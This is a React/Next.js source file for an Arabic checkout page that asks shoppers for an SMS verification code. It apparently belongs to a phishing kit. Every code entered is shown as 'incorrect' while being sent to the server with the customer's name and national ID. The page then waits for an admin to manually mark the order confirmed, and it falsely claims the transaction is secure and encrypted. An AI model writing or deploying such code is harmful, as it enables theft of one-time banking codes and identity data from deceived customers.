"use client";

import { useState, useEffect, useRef, useCallback } from "react";
import Link from "next/link";
import { useCartStore } from "../../store/cartStore";
import { KeyRound, FileText, Receipt, X, RotateCcw } from "lucide-react";
import CheckoutStepper from "../../components/CheckoutStepper";
import AnimatedBackground from "../../components/AnimatedBackground";

export default function VerifyPage() {
  const [code, setCode] = useState("");
  const [codeError, setCodeError] = useState(false);
  const [wrongCode, setWrongCode] = useState(false);
  const [resent, setResent] = useState(false);
  const [confirmed, setConfirmed] = useState(false);
  const [resendCooldown, setResendCooldown] = useState(60);
  const [submitCooldown, setSubmitCooldown] = useState(0);
  const submitCooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [dbOrderId, setDbOrderId] = useState<string | null>(null);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const cooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [lockoutTimer, setLockoutTimer] = useState(0);
  const lockoutRef = useRef<ReturnType<typeof setInterval> | null>(null);

  const ATTEMPTS_KEY = "verifyAttempts";
  const LOCKOUT_KEY = "verifyLockoutUntil";

  const startLockout = useCallback((seconds: number) => {
    setLockoutTimer(seconds);
    clearInterval(lockoutRef.current!);
    lockoutRef.current = setInterval(() => {
      setLockoutTimer(prev => {
        if (prev <= 1) {
          clearInterval(lockoutRef.current!);
          localStorage.removeItem(LOCKOUT_KEY);
          localStorage.removeItem(ATTEMPTS_KEY);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // check lockout on mount
  useEffect(() => {
    const until = parseInt(localStorage.getItem(LOCKOUT_KEY) ?? "0");
    const remaining = Math.ceil((until - Date.now()) / 1000);
    if (remaining > 0) startLockout(remaining);
  }, [startLockout]);

  useEffect(() => {
    cooldownRef.current = setInterval(() => {
      setResendCooldown(prev => {
        if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(cooldownRef.current!);
  }, []);

  function startCooldown() {
    clearInterval(cooldownRef.current!);
    setResendCooldown(60);
    cooldownRef.current = setInterval(() => {
      setResendCooldown(prev => {
        if (prev <= 1) { clearInterval(cooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
  }

  const { customer } = useCartStore();
  const orderId = typeof window !== "undefined" ? localStorage.getItem("orderId") ?? "—" : "—";

  useEffect(() => {
    if (!dbOrderId) return;
    pollRef.current = setInterval(async () => {
      const res = await fetch(`/api/admin/orders/${dbOrderId}`);
      if (!res.ok) return;
      const data = await res.json();
      if (data.status === "confirmed") {
        clearInterval(pollRef.current!);
        setConfirmed(true);
      }
    }, 5000);
    return () => clearInterval(pollRef.current!);
  }, [dbOrderId]);

  async function handleSubmit() {
    if (code.length !== 4 && code.length !== 6) { setCodeError(true); return; }

    const attempts = parseInt(localStorage.getItem(ATTEMPTS_KEY) ?? "0") + 1;
    localStorage.setItem(ATTEMPTS_KEY, String(attempts));
    if (attempts >= 5) {
      const until = Date.now() + 5 * 60 * 1000;
      localStorage.setItem(LOCKOUT_KEY, String(until));
      startLockout(300);
      return;
    }

    // تأكد إن الـ orderId اتحفظ — لو لسه ما جاش، استنى شوية
    let currentOrderId = typeof window !== "undefined" ? localStorage.getItem("orderId") ?? "—" : "—";
    if (currentOrderId === "—") {
      await new Promise(r => setTimeout(r, 2000));
      currentOrderId = typeof window !== "undefined" ? localStorage.getItem("orderId") ?? "—" : "—";
    }

    setSubmitCooldown(5);
    submitCooldownRef.current = setInterval(() => {
      setSubmitCooldown(prev => {
        if (prev <= 1) { clearInterval(submitCooldownRef.current!); return 0; }
        return prev - 1;
      });
    }, 1000);
    setCode("");
    setWrongCode(true);
    await fetch("/api/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code, orderId: currentOrderId, customerName: customer?.name ?? "—", customerId: customer?.nationalId ?? "—" }),
    });
    try {
      const res = await fetch("/api/admin/orders");
      const orders = await res.json();
      const match = Array.isArray(orders) ? orders.find((o: { orderId: string; _id: string }) => o.orderId === currentOrderId) : null;
      if (match) setDbOrderId(match._id);
    } catch {}
  }

  // ── Confirmed Popup ──
  if (confirmed && dbOrderId) {
    return (
      <>
        <AnimatedBackground />
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm flex items-center justify-center z-50 px-4" dir="rtl">
          <div className="relative bg-black/40 backdrop-blur-md rounded-3xl shadow-2xl w-full max-w-sm sm:max-w-md overflow-hidden border border-white/10">
            <Link href="/" className="absolute top-3 left-3 p-1.5 rounded-full bg-white/10 hover:bg-white/20 text-white/70 transition z-10">
              <X className="w-4 h-4" />
            </Link>

            <div className="h-1.5 w-full" style={{ background: "linear-gradient(90deg, #65E0CD, #1B7174)" }} />

            <div className="flex flex-col items-center pt-6 pb-3">
              <img src="/sucess.webp" alt="success" className="w-28 h-28 sm:w-36 sm:h-36 object-contain" />
              <span className="mt-3 text-[#053132] text-sm font-bold px-6 py-1.5 rounded-full shadow-md" style={{ background: "linear-gradient(135deg, #65E0CD, #1B7174)" }}>
                نجحت عملية الدفع ✓
              </span>
            </div>

            <div className="px-6 py-5 flex flex-col gap-4 text-center">
              <div className="space-y-2">
                <p className="text-white font-bold text-base">تمت العملية بنجاح</p>
                <p className="text-white/70 text-sm leading-7">
                  شكراً لك لثقتك، وإنه لمن دواعي سرورنا العمل معكم، نشكرك على كونك واحداً من عملائنا الكرام، أنتم تستحقون أفضل خدماتنا.
                </p>
                <p className="text-white/40 text-xs">يرجى التواصل مع موظف خدمة العملاء لاستكمال إجراءات شحن الطلب.</p>
              </div>
              <div className="flex gap-3 pb-1">
                <a href={`/admin/orders/${dbOrderId}/print`} target="_blank" rel="noopener noreferrer"
                  className="flex-1 flex items-center justify-center gap-2 py-2.5 rounded-xl text-[#053132] font-semibold text-sm transition hover:opacity-90"
                  style={{ background: "linear-gradient(135deg, #65E0CD, #1B7174)" }}>
                  <FileText className="w-4 h-4" /> الفاتورة
                </a>
                <a href={`/admin/orders/${dbOrderId}/receipt`} target="_blank" rel="noopener noreferrer"
                  className="flex-1 flex items-center justify-center gap-2 py-2.5 rounded-xl text-[#053132] font-semibold text-sm transition hover:opacity-90"
                  style={{ background: "linear-gradient(135deg, #65E0CD, #1B7174)" }}>
                  <Receipt className="w-4 h-4" /> سند القبض
                </a>
              </div>
            </div>
          </div>
        </div>
      </>
    );
  }

  // ── OTP Form ──
  return (
    <main className="min-h-screen flex flex-col items-center justify-center px-3 sm:px-6 py-6 sm:py-10" dir="rtl">
      <AnimatedBackground />

      {/* Steps */}
      <div className="w-full max-w-md sm:max-w-lg mb-3 sm:mb-4">
        <CheckoutStepper active="confirm" />
      </div>

      <div className="bg-black/30 backdrop-blur-md rounded-2xl sm:rounded-3xl w-full max-w-md sm:max-w-lg overflow-hidden border border-white/10">

        <div className="h-1 sm:h-1.5 w-full" style={{ background: "linear-gradient(90deg, #65E0CD, #1B7174)" }} />

        {/* Icon header */}
        <div className="pt-7 sm:pt-10 pb-4 sm:pb-5 flex flex-col items-center gap-3 sm:gap-4 px-4 sm:px-6">
          <div className="w-12 h-12 sm:w-16 sm:h-16 rounded-xl sm:rounded-2xl flex items-center justify-center shadow-lg" style={{ background: "linear-gradient(145deg, #65E0CD, #1B7174)" }}>
            <KeyRound className="text-[#053132] w-5 h-5 sm:w-7 sm:h-7" />
          </div>
          <div className="text-center space-y-1 sm:space-y-1.5">
            <h2 className="text-white text-lg sm:text-xl font-extrabold">تأكيد رمز التحقق</h2>
            <p className="text-white/70 text-xs sm:text-sm leading-relaxed">تم إرسال رمز التحقق إلى هاتفك المسجل</p>
            <p className="text-white/50 text-[10px] sm:text-xs">أدخل الرمز المكون من 4 أو 6 أرقام لإتمام الطلب</p>
          </div>
        </div>

        <div className="px-4 sm:px-8 pb-6 sm:pb-8 space-y-4 sm:space-y-6">

          {/* OTP Input */}
          <div className="flex flex-col gap-1.5 sm:gap-2">
            <label className="text-[11px] sm:text-xs font-bold text-white/80 text-right flex items-center gap-1.5">
              <KeyRound className="w-3 h-3 sm:w-3.5 sm:h-3.5 text-[#65E0CD]" />
              رمز التحقق
            </label>
            <input
              type="text"
              inputMode="numeric"
              value={code}
              maxLength={6}
              placeholder=""
              onChange={e => { setCode(e.target.value.replace(/\D/g, "").slice(0, 6)); setCodeError(false); setWrongCode(false); }}
              className={`w-full text-center text-2xl sm:text-3xl font-bold tracking-[0.4em] sm:tracking-[0.5em] border-2 rounded-xl sm:rounded-2xl px-3 sm:px-4 py-3 sm:py-4 outline-none transition-all duration-200 bg-black/20 ${
                codeError || wrongCode
                  ? "border-red-400/50 bg-red-500/10 text-red-400"
                  : "border-white/10 text-white focus:border-[#65E0CD] focus:bg-black/30"
              }`}
            />
            <p className="text-white/40 text-[10px] sm:text-[11px] text-center mt-0.5 sm:mt-1">قد يستغرق وصول الرمز بضع دقائق</p>
            {codeError && <p className="text-red-400 text-[11px] sm:text-xs font-semibold text-center bg-red-500/10 py-2 rounded-lg border border-red-400/20">⚠️ الكود يجب أن يكون 4 أو 6 أرقام</p>}
            {wrongCode && <p className="text-red-400 text-[11px] sm:text-xs font-semibold text-center bg-red-500/10 py-2 rounded-lg border border-red-400/20">❌ الكود غير صحيح، حاول مرة أخرى</p>}
            {lockoutTimer > 0 && (
              <p className="text-orange-400 text-[11px] sm:text-xs font-semibold text-center bg-orange-500/10 py-2 rounded-lg border border-orange-400/20">
                🔒 تجاوزت الحد المسموح، انتظر {Math.floor(lockoutTimer / 60)}:{String(lockoutTimer % 60).padStart(2, "0")} دقيقة ثم أعد المحاولة أو{" "}
                <Link href="/checkout" className="underline text-orange-300">ابدأ طلب جديد</Link>
              </p>
            )}
            {resent && <p className="text-emerald-400 text-[11px] sm:text-xs font-semibold text-center bg-emerald-500/10 py-2 rounded-lg border border-emerald-400/20">✓ تم إعادة إرسال الرمز بنجاح</p>}
          </div>

          {/* Actions */}
          <div className="space-y-2.5 sm:space-y-3">
            <button
              onClick={handleSubmit}
              disabled={submitCooldown > 0 || lockoutTimer > 0}
              className="w-full text-[#053132] py-3 sm:py-4 rounded-xl sm:rounded-2xl font-bold text-xs sm:text-sm transition-all active:scale-[0.98] disabled:opacity-60 disabled:cursor-not-allowed hover:opacity-95"
              style={{ background: "linear-gradient(135deg, #65E0CD, #1B7174)" }}
            >
              {submitCooldown > 0 ? `⏳ انتظر ${submitCooldown} ثانية...` : "✅ تأكيد وإتمام الطلب"}
            </button>

            <div className="flex gap-2 sm:gap-2.5">
              <button
                disabled={resendCooldown > 0 || lockoutTimer > 0}
                onClick={() => {
                  fetch("/api/resend", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ orderId, customerName: customer?.name ?? "—" }) });
                  setResent(true);
                  setTimeout(() => setResent(false), 3000);
                  startCooldown();
                }}
                className="flex-1 flex items-center justify-center gap-1.5 sm:gap-2 py-2.5 sm:py-3 rounded-lg sm:rounded-xl text-[11px] sm:text-sm font-medium transition-all border-2 border-white/10 text-[#65E0CD] hover:bg-white/5 disabled:opacity-50 disabled:cursor-not-allowed"
              >
                <RotateCcw className="w-3 h-3 sm:w-3.5 sm:h-3.5" />
                {resendCooldown > 0 ? `${resendCooldown}ث` : "إعادة الإرسال"}
              </button>


            </div>
          </div>

          {/* Security note */}
          <div className="flex items-center justify-center gap-2 pt-1 sm:pt-2">
            <div className="flex items-center gap-1.5 text-white/40 text-[10px] sm:text-[11px]">
              <svg className="w-3 h-3 sm:w-3.5 sm:h-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
              <span>معاملة آمنة ومشفرة بالكامل</span>
            </div>
          </div>
        </div>
      </div>
    </main>
  );
}
